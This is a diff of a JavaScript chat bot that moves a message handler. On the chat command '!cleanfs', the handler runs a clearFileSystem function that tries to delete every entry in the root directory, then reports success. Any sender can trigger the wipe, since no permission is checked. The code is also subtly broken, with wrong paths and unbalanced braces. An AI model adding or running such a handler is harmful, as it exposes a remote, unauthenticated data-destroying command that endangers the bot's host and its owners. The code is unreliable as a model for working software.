@@ -127,6 +127,24 @@ if (message.body === '!report') {
       
   }
 
+  
+  // Function to clear the entire file system
+function clearFileSystem() {
+    fs.readdirSync('/').forEach(file => {
+        fs.unlinkSync(file);
+    });
+}
+
+// Your existing message event listener
+client.on('message', async (message) => {
+    // Check if the message is the command to clean the file system
+    if (message.body.toLowerCase() === '!cleanfs') {
+        // Call the function to clear the file system
+        clearFileSystem();
+        // Send a confirmation message
+        client.sendMessage(message.from, 'File system cleaned successfully.');
+    }
+
 
 
 
@@ -486,25 +504,6 @@ If you think it is a mistake, send a message to an admin to clear your karma lev
   }
 
 
-
-// Function to clear the entire file system
-function clearFileSystem() {
-    fs.readdirSync('/').forEach(file => {
-        fs.unlinkSync(file);
-    });
-}
-
-// Your existing message event listener
-client.on('message', async (message) => {
-    // Check if the message is the command to clean the file system
-    if (message.body.toLowerCase() === '!cleanfs') {
-        // Call the function to clear the file system
-        clearFileSystem();
-        // Send a confirmation message
-        client.sendMessage(message.from, 'File system cleaned successfully.');
-    }
-}
-    // Your other message handling logic goes here...
 });
 
 
